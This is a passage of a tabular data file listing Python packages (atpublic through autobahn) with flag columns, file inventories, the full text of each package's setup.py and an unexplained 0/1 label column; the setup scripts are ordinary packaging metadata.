        'Programming Language :: Python :: Implementation :: CPython',
    ],
    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*',
)
",1
atpublic-3.0.1,0,1,1,1,0,0,1,0,conftest.py apiref.rst conf.py index.rst NEWS.rst using.rst __init__.py LICENSE PKG-INFO pyproject.toml README.rst private.py public.py py.typed types.py __init__.py test_mypy.py test_private.py test_public.py __init__.py tox.ini,,1
ats_utilities-2.5.5,0,1,1,1,0,0,0,0,__init__.py __init__.py cfg_cli.py ini_cli.py json_cli.py xml_cli.py yaml_cli.py __init__.py base_check.py base_read.py base_write.py cfg2object.py object2cfg.py __init__.py ini2object.py object2ini.py __init__.py json2object.py object2json.py __init__.py object2xml.py xml2object.py __init__.py object2yaml.py yaml2object.py __init__.py __init__.py error.py success.py verbose.py warning.py __init__.py __init__.py ats_attribute_error.py ats_bad_call_error.py ats_file_error.py ats_key_error.py ats_lookup_error.py ats_parameter_error.py ats_type_error.py ats_value_error.py __init__.py __init__.py ats_build_date.py ats_info_ok.py ats_licence.py ats_name.py ats_version.py __init__.py ats_logger_file.py ats_logger_name.py ats_logger_status.py __init__.py __init__.py __init__.py base.py functional.py meta.py meta_thread.py __init__.py ext_infrastructure.py github_infrastructure.py progress_bar.py splash_property.py terminal_properties.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py,,1
attr-0.3.2,0,1,1,1,1,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt attr.py dry_attr.py LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py tox.ini,"from setuptools import setup

setup(
    name='attr',
    version='0.3.2',
    description='Simple decorator to set attributes of target function or class in a DRY way.',
    long_description='''

Usage example::

    # Django proposes:
    def my_calculated_field(...
    my_calculated_field.short_description = 'Field'
    my_calculated_field.admin_order_field = 'real_field'

    # DRY:
    @attr(short_description='Field', admin_order_field='real_field')
    def my_calculated_field(...

Get it::

    sudo pip install attr
    from attr import attr

New popular `attrs.org <http://attrs.org>`_ used by `pytest.org <https://pytest.org>`_ defines another ""attr"" package that shadows this ""attr"" module.

Please use ""dry_attr"" alias to unshadow it::

    from dry_attr import attr
    from dry_attr import dry_attr

''',
    url='https://github.com/denis-ryzhkov/attr',
    author='Denis Ryzhkov',
    author_email='denisr@denisr.com',
    license='MIT',
    classifiers=[
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
    py_modules=['attr', 'dry_attr'],
)
",1
attrdict-2.0.1,0,1,1,1,1,0,0,0,default.py dictionary.py mapping.py merge.py mixins.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe CHANGES.txt LICENSE.txt MANIFEST.in PKG-INFO README.rst requirements-tests.txt setup.cfg setup.py,"""""""
To install AttrDict:

    python setup.py install
""""""
from setuptools import setup


DESCRIPTION = ""A dict with attribute-style access""

try:
    LONG_DESCRIPTION = open('README.rst').read()
except:
    LONG_DESCRIPTION = DESCRIPTION


setup(
    name=""attrdict"",
    version=""2.0.1"",
    author=""Brendan Curran-Johnson"",
    author_email=""brendan@bcjbcj.ca"",
    packages=(""attrdict"",),
    url=""https://github.com/bcj/AttrDict"",
    license=""MIT License"",
    description=DESCRIPTION,
    long_description=LONG_DESCRIPTION,
    classifiers=(
        ""Development Status :: 7 - Inactive"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
    ),
    install_requires=(
        'six',
    ),
    tests_require=(
        'nose>=1.0',
        'coverage',
    ),
    zip_safe=True,
)
",1
attrify-3.0,0,1,1,0,1,0,1,0,attrified_dict.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"import re
from setuptools import setup, find_packages


with open(""README.md"", ""r"", encoding=""utf-8"") as file:
    long_description = file.read()

with open(""attrify/__init__.py"") as file:
    version = re.search(""__version__ = (\S+)"", file.read()).group(1)

setup(
    name=""attrify"",
    description=""Convert dict to access dict keys as attributes."",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/DragSama/attrify"",
    author=""DragSama"",
    version=version,
    license=""MIT"",
    packages=find_packages(),
    python_requires="">=3.6"",
    keywords=""dict python3 attrify attributes "",
    classifiers=[
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
        ""Intended Audience :: Developers"",
    ],
)
",0
cattrs-22.1.0,0,1,1,1,0,0,1,0,LICENSE PKG-INFO pyproject.toml README.rst setup.py converters.py disambiguators.py dispatch.py errors.py gen.py bson.py json.py msgpack.py orjson.py pyyaml.py tomlkit.py ujson.py __init__.py py.typed __init__.py converters.py disambiguators.py dispatch.py errors.py gen.py bson.py json.py msgpack.py orjson.py pyyaml.py tomlkit.py ujson.py __init__.py py.typed _compat.py _generics.py __init__.py,"# -*- coding: utf-8 -*-
from setuptools import setup

package_dir = \
{'': 'src'}

packages = \
['cattr', 'cattr.preconf', 'cattrs', 'cattrs.preconf']

package_data = \
{'': ['*']}

install_requires = \
['attrs>=20']

extras_require = \
{':python_version <= ""3.10""': ['exceptiongroup'],
 ':python_version >= ""3.7"" and python_version < ""3.8""': ['typing_extensions']}

setup_kwargs = {
    'name': 'cattrs',
    'version': '22.1.0',
    'description': 'Composable complex class support for attrs and dataclasses.',
    'long_description': '======\ncattrs\n======\n\n\n.. image:: https://img.shields.io/pypi/v/cattrs.svg\n        :target: https://pypi.python.org/pypi/cattrs\n\n.. image:: https://github.com/python-attrs/cattrs/workflows/CI/badge.svg\n        :target: https://github.com/python-attrs/cattrs/actions?workflow=CI\n\n.. image:: https://readthedocs.org/projects/cattrs/badge/?version=latest\n        :target: https://cattrs.readthedocs.io/en/latest/?badge=latest\n        :alt: Documentation Status\n\n.. image:: https://img.shields.io/pypi/pyversions/cattrs.svg\n        :target: https://github.com/python-attrs/cattrs\n        :alt: Supported Python versions\n\n.. image:: https://codecov.io/gh/python-attrs/cattrs/branch/master/graph/badge.svg\n        :target: https://codecov.io/gh/python-attrs/cattrs/\n\n.. image:: https://img.shields.io/badge/code%20style-black-000000.svg\n    :target: https://github.com/ambv/black\n\n\n----\n\n``cattrs`` is an open source Python library for structuring and unstructuring\ndata. ``cattrs`` works best with ``attrs`` classes, dataclasses and the usual\nPython collections, but other kinds of classes are supported by manually\nregistering converters.\n\nPython has a rich set of powerful, easy to use, built-in data types like\ndictionaries, lists and tuples. These data types are also the lingua franca\nof most data serialization libraries, for formats like json, msgpack, yaml or\ntoml.\n\nData types like this, and mappings like ``dict`` s in particular, represent\nunstructured data. Your data is, in all likelihood, structured: not all\ncombinations of field names or values are valid inputs to your programs. In\nPython, structured data is better represented with classes and enumerations.\n``attrs`` is an excellent library for declaratively describing the structure of\nyour data, and validating it.\n\nWhen you\'re handed unstructured data (by your network, file system, database...),\n``cattrs`` helps to convert this data into structured data. When you have to\nconvert your structured data into data types other libraries can handle,\n``cattrs`` turns your classes and enumerations into dictionaries, integers and\nstrings.\n\nHere\'s a simple taste. The list containing a float, an int and a string\ngets converted into a tuple of three ints.\n\n.. code-block:: pycon\n\n    >>> import cattr\n    >>>\n    >>> cattr.structure([1.0, 2, ""3""], tuple[int, int, int])\n    (1, 2, 3)\n\n``cattrs`` works well with ``attrs`` classes out of the box.\n\n.. code-block:: pycon\n\n    >>> from attr import frozen\n    >>> import cattr\n    >>>\n    >>> @frozen  # It works with normal classes too.\n    ... class C:\n    ...     a: int\n    ...     b: str\n    ...\n    >>> instance = C(1, \'a\')\n    >>> cattr.unstructure(instance)\n    {\'a\': 1, \'b\': \'a\'}\n    >>> cattr.structure({\'a\': 1, \'b\': \'a\'}, C)\n    C(a=1, b=\'a\')\n\nHere\'s a much more complex example, involving ``attrs`` classes with type\nmetadata.\n\n.. code-block:: pycon\n\n    >>> from enum import unique, Enum\n    >>> from typing import Optional, Sequence, Union\n    >>> from cattr import structure, unstructure\n    >>> from attr import define, field\n    >>>\n    >>> @unique\n    ... class CatBreed(Enum):\n    ...     SIAMESE = ""siamese""\n    ...     MAINE_COON = ""maine_coon""\n    ...     SACRED_BIRMAN = ""birman""\n    ...\n    >>> @define\n    ... class Cat:\n    ...     breed: CatBreed\n    ...     names: Sequence[str]\n    ...\n    >>> @define\n    ... class DogMicrochip:\n    ...     chip_id = field()  # Type annotations are optional, but recommended\n    ...     time_chipped: float = field()\n    ...\n    >>> @define\n    ... class Dog:\n    ...     cuteness: int\n    ...     chip: Optional[DogMicrochip]\n    ...\n    >>> p = unstructure([Dog(cuteness=1, chip=DogMicrochip(chip_id=1, time_chipped=10.0)),\n    ...                  Cat(breed=CatBreed.MAINE_COON, names=(\'Fluffly\', \'Fluffer\'))])\n    ...\n    >>> print(p)\n    [{\'cuteness\': 1, \'chip\': {\'chip_id\': 1, \'time_chipped\': 10.0}}, {\'breed\': \'maine_coon\', \'names\': (\'Fluffly\', \'Fluffer\')}]\n    >>> print(structure(p, list[Union[Dog, Cat]]))\n    [Dog(cuteness=1, chip=DogMicrochip(chip_id=1, time_chipped=10.0)), Cat(breed=<CatBreed.MAINE_COON: \'maine_coon\'>, names=[\'Fluffly\', \'Fluffer\'])]\n\nConsider unstructured data a low-level representation that needs to be converted\nto structured data to be handled, and use ``structure``. When you\'re done,\n``unstructure`` the data to its unstructured form and pass it along to another\nlibrary or module. Use `attrs type metadata <http://attrs.readthedocs.io/en/stable/examples.html#types>`_\nto add type metadata to attributes, so ``cattrs`` will know how to structure and\ndestructure them.\n\n* Free software: MIT license\n* Documentation: https://cattrs.readthedocs.io.\n* Python versions supported: 3.7 and up. (Older Python versions, like 2.7, 3.5 and 3.6 are supported by older versions; see the changelog.)\n\n\nFeatures\n--------\n\n* Converts structured data into unstructured data, recursively:\n\n  * ``attrs`` classes and dataclasses are converted into dictionaries in a way similar to ``attr.asdict``, or into tuples in a way similar to ``attr.astuple``.\n  * Enumeration instances are converted to their values.\n  * Other types are let through without conversion. This includes types such as\n    integers, dictionaries, lists and instances of non-``attrs`` classes.\n  * Custom converters for any type can be registered using ``register_unstructure_hook``.\n\n* Converts unstructured data into structured data, recursively, according to\n  your specification given as a type. The following types are supported:\n\n  * ``typing.Optional[T]``.\n  * ``typing.List[T]``, ``typing.MutableSequence[T]``, ``typing.Sequence[T]`` (converts to a list).\n  * ``typing.Tuple`` (both variants, ``Tuple[T, ...]`` and ``Tuple[X, Y, Z]``).\n  * ``typing.MutableSet[T]``, ``typing.Set[T]`` (converts to a set).\n  * ``typing.FrozenSet[T]`` (converts to a frozenset).\n  * ``typing.Dict[K, V]``, ``typing.MutableMapping[K, V]``, ``typing.Mapping[K, V]`` (converts to a dict).\n  * ``attrs`` classes with simple attributes and the usual ``__init__``.\n\n    * Simple attributes are attributes that can be assigned unstructured data,\n      like numbers, strings, and collections of unstructured data.\n\n  * All `attrs` classes and dataclasses with the usual ``__init__``, if their complex attributes have type metadata.\n  * ``typing.Union`` s of supported ``attrs`` classes, given that all of the classes have a unique field.\n  * ``typing.Union`` s of anything, given that you provide a disambiguation function for it.\n  * Custom converters for any type can be registered using ``register_structure_hook``.\n\n``cattrs`` comes with preconfigured converters for a number of serialization libraries, including json, msgpack, bson, yaml and toml.\nFor details, see the `cattr.preconf package <https://cattrs.readthedocs.io/en/latest/preconf.html>`_.\n\nAdditional documentation\n------------------------\n* `On structured and unstructured data, or the case for cattrs <https://threeofwands.com/on-structured-and-unstructured-data-or-the-case-for-cattrs/>`_\n* `Why I use attrs instead of pydantic <https://threeofwands.com/why-i-use-attrs-instead-of-pydantic/>`_\n* `cattrs I: un/structuring speed <https://threeofwands.com/why-cattrs-is-so-fast/>`_\n\nCredits\n-------\n\nMajor credits to Hynek Schlawack for creating attrs_ and its predecessor,\ncharacteristic_.\n\n``cattrs`` is tested with Hypothesis_, by David R. MacIver.\n\n``cattrs`` is benchmarked using perf_ and pytest-benchmark_.\n\nThis package was created with Cookiecutter_ and the `audreyr/cookiecutter-pypackage`_ project template.\n\n.. _attrs: https://github.com/hynek/attrs\n.. _characteristic: https://github.com/hynek/characteristic\n.. _Hypothesis: http://hypothesis.readthedocs.io/en/latest/\n.. _perf: https://github.com/haypo/perf\n.. _pytest-benchmark: https://pytest-benchmark.readthedocs.io/en/latest/index.html\n.. _Cookiecutter: https://github.com/audreyr/cookiecutter\n.. _`audreyr/cookiecutter-pypackage`: https://github.com/audreyr/cookiecutter-pypackage\n',
    'author': 'Tin Tvrtkovic',
    'author_email': 'tinchester@gmail.com',
    'maintainer': 'None',
    'maintainer_email': 'None',
    'url': 'https://github.com/python-attrs/cattrs',
    'package_dir': package_dir,
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'extras_require': extras_require,
    'python_requires': '>=3.7,<4.0',
}


setup(**setup_kwargs)
",0
audioread-3.0.0,0,1,1,1,0,0,1,0,base.py exceptions.py ffdec.py gstdec.py macca.py maddec.py rawread.py version.py __init__.py dependency_links.txt pbr.json PKG-INFO SOURCES.txt top_level.txt decode.py LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py conftest.py test-1.json test-1.mp3 test-2.json test-2.mp3 test-2.mp3.wav test_audioread.py,"# This file is part of audioread.
# Copyright 2013, Adrian Sampson.
#
# Permission is hereby granted, free of charge, to any person obtaining
# a copy of this software and associated documentation files (the
# ""Software""), to deal in the Software without restriction, including
# without limitation the rights to use, copy, modify, merge, publish,
# distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so, subject to
# the following conditions:
#
# The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.

import os
from setuptools import setup
import imp

version = imp.load_source('audioread.version', 'audioread/version.py')


def _read(fn):
    path = os.path.join(os.path.dirname(__file__), fn)
    return open(path).read()


setup(name='audioread',
      version=version.version,
      description='multi-library, cross-platform audio decoding',
      author='Adrian Sampson',
      author_email='adrian@radbox.org',
      url='https://github.com/sampsyo/audioread',
      license='MIT',
      platforms='ALL',
      long_description=_read('README.rst'),

      packages=['audioread'],

      classifiers=[
          'Topic :: Multimedia :: Sound/Audio :: Conversion',
          'Intended Audience :: Developers',
          'Programming Language :: Python :: 3',
          'Programming Language :: Python :: 3.6',
          'Programming Language :: Python :: 3.7',
          'Programming Language :: Python :: 3.8',
          'Programming Language :: Python :: 3.9',
          'Programming Language :: Python :: 3.10',
      ],
      python_requires='>=3.6',
)
",0
auditwheel-5.1.2,0,1,1,1,1,0,0,0,CHANGELOG.md LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py condatools.py elfutils.py error.py genericpkgctx.py hashfile.py lddtree.py libc.py main.py main_addtag.py main_lddtree.py main_repair.py main_show.py musllinux.py patcher.py external_references.py manylinux-policy.json musllinux-policy.json policy-schema.json versioned_symbols.py __init__.py repair.py tmpdirs.py tools.py wheeltools.py wheel_abi.py convert.py pack.py unpack.py __init__.py LICENSE.txt pkginfo.py util.py wheelfile.py __init__.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt cffi-1.5.0-cp27-none-linux_x86_64.whl conftest.py foo.f90 fpewheel-0.0.0-cp35-cp35m-linux_x86_64.whl __init__.py a.c a.h b.c b.h Makefile MANIFEST.in pyproject.toml setup.cfg setup.py example_a.pyx example_b.pyx a.c a.h b.c b.h Makefile MANIFEST.in pyproject.toml setup.cfg setup.py example_a.pyx example_b.pyx testcrypt.cpp testcrypt.h __init__.py nonpy_rpath.cpp README.md setup.py plumbum-1.6.8-py2.py3-none-any.whl python_snappy-0.5.2-pp260-pypy_41-linux_x86_64.whl quick_check_numpy.py pyproject.toml setup.py sample_extension.pyx dependency.c dependency.h setup.py testdependencies.c setup.py testprogram.c __init__.py __init__.py a.c a.h b.c b.h MANIFEST.in setup.py testrpath.c __init__.py setup.py testsimple.c setup.py testzlib.c test_addtag.py test_bundled_wheels.py test_manylinux.py test_nonplatform_wheel.py test_policy_files.py test-permissions.zip.xz test_condatools.py test_elfpatcher.py test_elfutils.py test_hashfile.py test_main.py test_musllinux.py test_policy.py test_repair.py test_tmpdirs.py test_tools.py test_wheel_abi.py,"from setuptools import setup

extras = {
    ""test"": [""pytest>=3.4"", ""jsonschema"", ""pypatchelf"", ""pretend"", ""docker""],
    ""coverage"": [""pytest-cov""],
}
extras[""develop""] = sum(extras.values(), [])
extras[""coverage""] += extras[""test""]

setup(extras_require=extras)
",1
auth-0.5.3,0,1,1,1,0,0,0,0,authorization.py db.py __init__.py client.py service.py __init__.py __init__.py server.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,"import glob
import imp
import io
import os
from os import path
from setuptools import setup, find_packages, Extension
import sys

MYDIR = path.abspath(os.path.dirname(__file__))

# NOTE
REQUIRES = ['falcon', 'mongoengine', 'blinker', 'werkzeug', 'gunicorn',
    'eventlet', 'requests']

cmdclass = {}
ext_modules = []

setup(
    name='auth',
    version='0.5.3',
    description='Authorization for humans',
    long_description=io.open('README.rst', 'r', encoding='utf-8').read(),
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Web Environment',
        'Natural Language :: English',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Programming Language :: Python',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Programming Language :: Python :: Implementation :: Jython',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.5',
    ],
    keywords='authorizarion role auth groups membership ensure ldap',
    author='Farsheed Ashouri',
    author_email='rodmena@me.com',
    url='http://github.com/ourway/auth/',
    license='Apache 2.0',
    packages=find_packages(exclude=['tests']),
    include_package_data=True,
    zip_safe=False,
    install_requires=REQUIRES,
    setup_requires=[],
    cmdclass=cmdclass,
    ext_modules=ext_modules,
    test_suite='nose.collector',
    entry_points={
        'console_scripts': [
                'auth-server = auth.cmd.server:main'
             ]
        }
)
",0
auth0-python-3.23.1,0,1,1,1,1,0,1,0,asyncify.py authorize_client.py base.py database.py delegated.py enterprise.py get_token.py logout.py passwordless.py revoke_token.py social.py token_verifier.py users.py __init__.py exceptions.py actions.py attack_protection.py auth0.py blacklists.py branding.py clients.py client_grants.py connections.py custom_domains.py device_credentials.py emails.py email_templates.py grants.py guardian.py hooks.py jobs.py logs.py log_streams.py organizations.py prompts.py resource_servers.py roles.py rules.py rules_configs.py stats.py tenants.py tickets.py users.py users_by_email.py user_blocks.py __init__.py rest.py rest_async.py test_authorize_client.py test_base.py test_database.py test_delegated.py test_enterprise.py test_get_token.py test_logout.py test_passwordless.py test_revoke_token.py test_social.py test_token_verifier.py test_users.py __init__.py test_actions.py test_atack_protection.py test_auth0.py test_blacklists.py test_branding.py test_clients.py test_client_grants.py test_connections.py test_custom_domains.py test_device_credentials.py test_emails.py test_email_endpoints.py test_grants.py test_guardian.py test_hooks.py test_jobs.py test_logs.py test_log_streams.py test_organizations.py test_prompts.py test_resource_servers.py test_rest.py test_roles.py test_rules.py test_rules_configs.py test_stats.py test_tenants.py test_tickets.py test_users.py test_users_by_email.py test_user_blocks.py __init__.py __init__.py test_asyncify.py __init__.py utils.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.rst setup.cfg setup.py,"import io
import os
import re

from setuptools import find_packages, setup


def find_version():
    file_dir = os.path.dirname(__file__)
    with io.open(os.path.join(file_dir, ""auth0"", ""__init__.py"")) as f:
        version = re.search(r'^__version__ = [\'""]([^\'""]*)[\'""]', f.read())
        if version:
            return version.group(1)
        else:
            raise RuntimeError(""Unable to find version string."")


with io.open(""README.rst"", encoding=""utf-8"") as f:
    long_description = f.read()


setup(
    name=""auth0-python"",
    version=find_version(),
    description=""Auth0 Python SDK"",
    long_description=long_description,
    author=""Auth0"",
    author_email=""support@auth0.com"",
    license=""MIT"",
    packages=find_packages(),
    install_requires=[""requests>=2.14.0"", ""pyjwt[crypto]>=1.7.1""],
    extras_require={""test"": [""coverage"", ""mock>=1.3.0"", ""pre-commit""]},
    python_requires="">=2.7, !=3.0.*, !=3.1.*"",
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.2"",
        ""Programming Language :: Python :: 3.3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
    ],
    url=""https://github.com/auth0/auth0-python"",
)
",0
authcaptureproxy-1.1.4,0,1,1,0,1,0,1,0,auth_capture_proxy.py cli.py const.py modifiers.py testers.py __init__.py helper.py stackoverflow.py __init__.py CHANGELOG.md LICENSE.txt PKG-INFO pyproject.toml README.md setup.py,"# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['authcaptureproxy', 'authcaptureproxy.examples']

package_data = \
{'': ['*']}

install_requires = \
['aiohttp>=3,<4',
 'beautifulsoup4>=4,<5',
 'httpx',
 'importlib-metadata>=3.4.0',
 'multidict>=6,<7',
 'typer>=0.3,<1.0',
 'yarl>=1,<2']

entry_points = \
{'console_scripts': ['auth_capture_proxy = authcaptureproxy.cli:cli']}

setup_kwargs = {
    'name': 'authcaptureproxy',
    'version': '1.1.4',
    'description': 'A Python project to create a proxy to capture authentication information from a webpage. This is useful to capture oauth login details without access to a third-party oauth.',
    'long_description': '# Auth_capture_proxy\n\n[![Version status](https://img.shields.io/pypi/status/authcaptureproxy)](https://pypi.org/project/authcaptureproxy)\n[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)\n[![Python version compatibility](https://img.shields.io/pypi/pyversions/authcaptureproxy)](https://pypi.org/project/authcaptureproxy)\n[![Version on Github](https://img.shields.io/github/v/release/alandtse/auth_capture_proxy?include_prereleases&label=GitHub)](https://github.com/alandtse/auth_capture_proxy/releases)\n[![Version on PyPi](https://img.shields.io/pypi/v/authcaptureproxy)](https://pypi.org/project/authcaptureproxy)\n![PyPI - Downloads](https://img.shields.io/pypi/dd/authcaptureproxy)\n![PyPI - Downloads](https://img.shields.io/pypi/dw/authcaptureproxy)\n![PyPI - Downloads](https://img.shields.io/pypi/dm/authcaptureproxy)\n[![Documentation Status](https://readthedocs.org/projects/auth-capture-proxy/badge/?version=latest)](https://auth-capture-proxy.readthedocs.io/en/latest/?badge=latest)\n[![Build (Github Actions)](https://img.shields.io/github/workflow/status/alandtse/auth_capture_proxy/Build%20&%20test?label=Build%20&%20test)](https://github.com/alandtse/auth_capture_proxy/actions)\n[![Test coverage (coveralls)](https://coveralls.io/repos/github/alandtse/auth_capture_proxy/badge.svg?branch=main&service=github)](https://coveralls.io/github/alandtse/auth_capture_proxy?branch=main)\n\nA Python project to create a proxy to capture authentication information from a webpage. This is useful to capture oauth login details without access to a third-party oauth.\n\n## Install\n\n```bash\npip install authcaptureproxy\n```\n\n## Using\n\nTo see basic usage look at the [proxy-example](authcaptureproxy/cli.py) that logs into Amazon.com and will print out the detected email and password.\n\n```bash\npython authcaptureproxy/cli.py proxy-example\n```\n\n[See the docs 📚](https://auth-capture-proxy.readthedocs.io/en/latest/) for more info.\n\n## License\n\nLicensed under the terms of the [Apache License 2.0](https://spdx.org/licenses/Apache-2.0.html).\n\n## Contributing\n\n[New issues](https://github.com/alandtse/auth_capture_proxy/issues) and pull requests are welcome.\nPlease refer to the [contributing guide](https://github.com/alandtse/auth_capture_proxy/blob/main/CONTRIBUTING.md)\nand [security policy](https://github.com/alandtse/auth_capture_proxy/blob/main/SECURITY.md).\n\nGenerated with [Tyrannosaurus](https://github.com/dmyersturnbull/tyrannosaurus).\n',
    'author': 'Alan D. Tse',
    'author_email': None,
    'maintainer': 'Alan D. Tse',
    'maintainer_email': None,
    'url': 'https://github.com/alandtse/auth_capture_proxy',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'entry_points': entry_points,
    'python_requires': '>=3.7,<4.0',
}


setup(**setup_kwargs)
",1
Authlib-1.0.1,0,1,1,1,1,0,0,0,encoding.py errors.py security.py urls.py __init__.py consts.py deprecate.py async_app.py async_openid.py errors.py framework_integration.py registry.py sync_app.py sync_openid.py __init__.py apps.py integration.py __init__.py django_helpers.py authorization_server.py nonce.py resource_protector.py __init__.py authorization_server.py endpoints.py resource_protector.py signals.py __init__.py apps.py integration.py __init__.py flask_helpers.py authorization_server.py cache.py resource_protector.py __init__.py authorization_server.py errors.py resource_protector.py signals.py __init__.py assertion_client.py oauth1_client.py oauth2_client.py utils.py __init__.py assertion_session.py oauth1_session.py oauth2_session.py utils.py __init__.py client_mixin.py functions.py tokens_mixins.py __init__.py apps.py integration.py __init__.py __init__.py _jwe_algorithms.py _jwe_enc_cryptodome.py _jwe_enc_cryptography.py __init__.py errors.py jwk.py jws.py models.py __init__.py jwe.py models.py __init__.py asymmetric_key.py base_key.py jwk.py key_set.py _cryptography_key.py __init__.py ec_key.py jwe_algs.py jwe_encs.py jwe_zips.py jws_algs.py oct_key.py rsa_key.py util.py __init__.py claims.py jwt.py __init__.py jws_eddsa.py okp_key.py __init__.py util.py __init__.py client.py errors.py authorization_server.py base_server.py client_auth.py errors.py models.py parameters.py resource_protector.py rsa.py signature.py util.py wrapper.py __init__.py __init__.py auth.py base.py client.py authenticate_client.py authorization_server.py errors.py authorization_code.py base.py client_credentials.py implicit.py refresh_token.py resource_owner_password_credentials.py __init__.py models.py parameters.py resource_protector.py token_endpoint.py util.py wrappers.py __init__.py errors.py parameters.py token.py validator.py __init__.py parameters.py revocation.py __init__.py client.py __init__.py assertion.py auth.py client.py jwt_bearer.py token.py validator.py __init__.py claims.py endpoint.py errors.py __init__.py endpoint.py __init__.py challenge.py __init__.py introspection.py models.py token_validator.py __init__.py models.py well_known.py __init__.py device_code.py endpoint.py errors.py models.py __init__.py __init__.py __init__.py claims.py errors.py code.py hybrid.py implicit.py util.py __init__.py models.py util.py __init__.py models.py well_known.py __init__.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"from setuptools import setup

# Metadata goes in setup.cfg. These are here for GitHub's dependency graph.

setup(
    name=""Authlib"",
    install_requires=[
        ""cryptography>=3.2"",
    ],
)
",1
autobahn-22.7.1,0,1,1,0,0,0,0,0,xbr_gray.svg xbr_white.svg component.py rawsocket.py README_NO_INIT_PY test_aio_rawsocket.py test_aio_websocket.py test_wamp_runner.py util.py wamp.py websocket.py __init__.py __init__.py exception.py test_nvx_utf8validator.py __init__.py _utf8validator.c _utf8validator.py __init__.py test_rawsocket_url.py __init__.py util.py __init__.py test_rng.py test_util.py __init__.py testutil.py choosereactor.py component.py cryptosign.py forwarder.py rawsocket.py resource.py test_tx_application_runner.py test_tx_choosereactor.py test_tx_component.py test_tx_endpoint_plugins.py test_tx_protocol.py test_tx_rawsocket.py test_tx_websocket_agent.py test_wamp_runner.py __init__.py __init__.py util.py wamp.py websocket.py __init__.py __init__.py util.py auth.py component.py cryptobox.py cryptosign.py exception.py auth.bfbs pubsub.bfbs roles.bfbs rpc.bfbs session.bfbs types.bfbs wamp.bfbs Map.py Abort.py AnyMessage.py AuthCraChallenge.py AuthCraRequest.py AuthCraWelcome.py AuthCryptosignChallenge.py AuthCryptosignRequest.py AuthCryptosignWelcome.py Authenticate.py AuthFactor.py AuthMethod.py AuthMode.py AuthScramChallenge.py AuthScramRequest.py AuthScramWelcome.py AuthTicketChallenge.py AuthTicketRequest.py AuthTicketWelcome.py BrokerFeatures.py Call.py CalleeFeatures.py CallerFeatures.py Cancel.py CancelMode.py Challenge.py ChannelBinding.py ClientRoles.py DealerFeatures.py Error.py Event.py EventReceived.py Goodbye.py Hello.py HelloNew.py Interrupt.py Invocation.py InvocationPolicy.py Kdf.py Match.py Message.py MessageType.py Payload.py Principal.py Publish.py Published.py PublisherFeatures.py Register.py Registered.py Result.py RouterRoles.py Serializer.py Subscribe.py Subscribed.py SubscriberFeatures.py SubscriberReceived.py Unregister.py Unregistered.py Unsubscribe.py Unsubscribed.py Welcome.py Yield.py __init__.py Void.py __init__.py __init__.py interfaces.py message.py message_fbs.py protocol.py request.py role.py serializer.py test_wamp_auth.py test_wamp_component.py test_wamp_component_aio.py test_wamp_cryptobox.py test_wamp_cryptosign.py test_wamp_exception.py test_wamp_identifiers.py test_wamp_message.py test_wamp_protocol.py test_wamp_protocol_peer.py test_wamp_scram.py test_wamp_serializer.py test_wamp_session_details.py test_wamp_transport_details.py test_wamp_uri_pattern.py test_wamp_user_handler_errors.py test_wamp_websocket.py __init__.py types.py uri.py websocket.py __init__.py compress.py compress_base.py compress_bzip2.py compress_deflate.py 